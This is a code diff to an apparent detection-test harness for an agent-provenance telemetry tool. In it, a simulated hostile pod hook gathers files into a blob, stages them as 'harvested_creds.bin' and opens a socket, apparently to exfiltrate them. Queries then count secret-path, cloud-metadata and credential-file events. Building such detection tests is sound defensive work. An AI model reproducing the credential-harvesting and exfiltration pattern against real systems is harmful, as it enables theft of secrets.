@@ -61,6 +61,11 @@ def _install_hook():
                 blob += fh.read()
         except Exception:
             pass
+    try:  # stage the harvested creds to a workspace file before exfil (a real TTP)
+        with open(os.path.join(os.getcwd(), "harvested_creds.bin"), "wb") as fh:
+            fh.write(blob)
+    except Exception:
+        pass
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(2)
@@ -188,7 +193,8 @@ read BOB_PID BOB_CG  < <(resolve podb-run.sh) || { echo "FAIL: bob pid"; exit 1;
 read ALICE_PID ALICE_CG < <(resolve poda-run.sh) || { echo "FAIL: alice pid"; exit 1; }
 BOB_UID="$($KUBECTL get pod bob -n "$NS" -o jsonpath='{.metadata.uid}')"
 ALICE_UID="$($KUBECTL get pod alice -n "$NS" -o jsonpath='{.metadata.uid}')"
-echo "  bob: pid=$BOB_PID cgroup=$BOB_CG | alice: pid=$ALICE_PID cgroup=$ALICE_CG"
+ALICE_IP="$($KUBECTL get pod alice -n "$NS" -o jsonpath='{.status.podIP}')"
+echo "  bob: pid=$BOB_PID cgroup=$BOB_CG ip=$BOB_IP | alice: pid=$ALICE_PID cgroup=$ALICE_CG ip=$ALICE_IP"
 
 echo "== node sensor: capture ${CAPTURE_SECONDS}s across BOTH cgroups"
 START="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
@@ -205,8 +211,8 @@ echo "  events: bob-cgroup=$(grep -cF "\"cgroup_id\":\"$BOB_CG\"" "$J") alice-cg
 
 echo "== ONE run: bind BOTH cgroups, ingest, bridge hooklog + correlate"
 rm -rf "$DATA"; "$AGENTPROV" --data-dir "$DATA" init >/dev/null
-"$AGENTPROV" --data-dir "$DATA" sandbox bind-cgroup --run "$RUN" --cgroup-id "$BOB_CG"   --session "$BOB_UID"   --started-at "$START" --pod-name bob   --namespace "$NS" --labels app=bob,role=worker >/dev/null
-"$AGENTPROV" --data-dir "$DATA" sandbox bind-cgroup --run "$RUN" --cgroup-id "$ALICE_CG" --session "$ALICE_UID" --started-at "$START" --pod-name alice --namespace "$NS" --labels app=alice,role=orchestrator >/dev/null
+"$AGENTPROV" --data-dir "$DATA" sandbox bind-cgroup --run "$RUN" --cgroup-id "$BOB_CG"   --session "$BOB_UID"   --started-at "$START" --pod-name bob   --namespace "$NS" --pod-ip "$BOB_IP"   --labels app=bob,role=worker >/dev/null
+"$AGENTPROV" --data-dir "$DATA" sandbox bind-cgroup --run "$RUN" --cgroup-id "$ALICE_CG" --session "$ALICE_UID" --started-at "$START" --pod-name alice --namespace "$NS" --pod-ip "$ALICE_IP" --labels app=alice,role=orchestrator >/dev/null
 "$AGENTPROV" --data-dir "$DATA" telemetry ingest-jsonl --run "$RUN" --file "$WORK/pods.jsonl" --format native 2>&1 | grep -o 'ingested=[0-9]*' | sed 's/^/  /'
 "$AGENTPROV" --data-dir "$DATA" hooks bridge --run "$RUN" --file "$HOOKLOG" --correlate 2>&1 | grep -oE '"(agents|message_edges|syscall_edges|refusals)": *[0-9]+' | sed 's/^/  /'
 "$AGENTPROV" --data-dir "$DATA" graph verify --run "$RUN" 2>&1 | head -1 | sed 's/^/  /'
@@ -224,6 +230,7 @@ print("  secret_path events in BOB cgroup:", q("select count(*) from events wher
 print("  metadata/169.254 events in BOB cgroup:", q("select count(*) from events where run_id=? and cgroup_id=? and payload like '%169.254.169.254%'", run, bobcg))
 print("  secret/metadata events in ALICE cgroup (want 0):", q("select count(*) from events where run_id=? and cgroup_id=? and (event_type='secret_path' or payload like '%169.254%')", run, alicecg))
 print("  alice->bob cross-pod calls (to bob pod IP):", q("select count(*) from events where run_id=? and cgroup_id=? and payload like ?", run, alicecg, '%'+bobip+'%'))
+print("  file writes captured (bob harvested_creds.bin):", q("select count(*) from events where run_id=? and event_type='file_write' and payload like '%harvested_creds%'", run))
 PY
 
 if [ "$SERVE" = "1" ]; then
